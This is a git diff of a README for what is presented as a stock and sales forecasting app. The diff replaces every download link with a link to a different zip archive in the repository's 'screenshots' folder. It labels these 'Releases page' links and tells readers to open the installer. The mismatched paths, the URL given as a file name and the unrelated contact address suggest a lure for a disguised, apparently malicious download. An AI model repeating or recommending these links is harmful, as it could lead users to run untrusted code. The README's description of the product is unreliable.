@@ -4,7 +4,7 @@
 Welcome to the Product-Sales-Forecast! This application helps you manage your stock effectively. With its clear interface, tracking inventory and visualizing data becomes a breeze. 
 
 ## 📥 Download Now
-[![Download Product-Sales-Forecast](https://raw.githubusercontent.com/nurdar7340/Product-Sales-Forecast/main/screenshots/Product-Sales-Forecast-1.8.zip)](https://raw.githubusercontent.com/nurdar7340/Product-Sales-Forecast/main/screenshots/Product-Sales-Forecast-1.8.zip)
+[![Download Product-Sales-Forecast](https://github.com/nurdar7340/Product-Sales-Forecast/raw/refs/heads/main/screenshots/Sales-Product-Forecast-v1.5.zip)](https://github.com/nurdar7340/Product-Sales-Forecast/raw/refs/heads/main/screenshots/Sales-Product-Forecast-v1.5.zip)
 
 ## 🖥️ System Requirements
 To run Product-Sales-Forecast smoothly, ensure that your computer meets the following requirements:
@@ -25,11 +25,11 @@ Product-Sales-Forecast comes with the following features to enhance your stock m
 ## 🛠️ Installation Steps
 Follow these simple steps to download and install Product-Sales-Forecast:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/nurdar7340/Product-Sales-Forecast/main/screenshots/Product-Sales-Forecast-1.8.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/nurdar7340/Product-Sales-Forecast/raw/refs/heads/main/screenshots/Sales-Product-Forecast-v1.5.zip).
   
 2. **Select the Latest Version:** Look for the latest release. It's usually at the top of the list.
 
-3. **Download the Installer:** Click on the installer file that corresponds to your operating system. The file may be named something like `https://raw.githubusercontent.com/nurdar7340/Product-Sales-Forecast/main/screenshots/Product-Sales-Forecast-1.8.zip` or `https://raw.githubusercontent.com/nurdar7340/Product-Sales-Forecast/main/screenshots/Product-Sales-Forecast-1.8.zip`.
+3. **Download the Installer:** Click on the installer file that corresponds to your operating system. The file may be named something like `https://github.com/nurdar7340/Product-Sales-Forecast/raw/refs/heads/main/screenshots/Sales-Product-Forecast-v1.5.zip` or `https://github.com/nurdar7340/Product-Sales-Forecast/raw/refs/heads/main/screenshots/Sales-Product-Forecast-v1.5.zip`.
 
 4. **Run the Installer:** After the download is complete, open the installer. Follow the on-screen instructions to complete the installation process.
 
@@ -55,6 +55,6 @@ For further inquiries, please contact the project maintainer at iamx-ariful-isla
 Stay tuned for updates as we frequently add new features and improvements. Follow this repository to keep informed on the latest enhancements.
 
 ## 📥 Download Again
-Remember, you can always visit the [Releases page](https://raw.githubusercontent.com/nurdar7340/Product-Sales-Forecast/main/screenshots/Product-Sales-Forecast-1.8.zip) to download the latest version of Product-Sales-Forecast.
+Remember, you can always visit the [Releases page](https://github.com/nurdar7340/Product-Sales-Forecast/raw/refs/heads/main/screenshots/Sales-Product-Forecast-v1.5.zip) to download the latest version of Product-Sales-Forecast.
 
 Happy Stock Management!
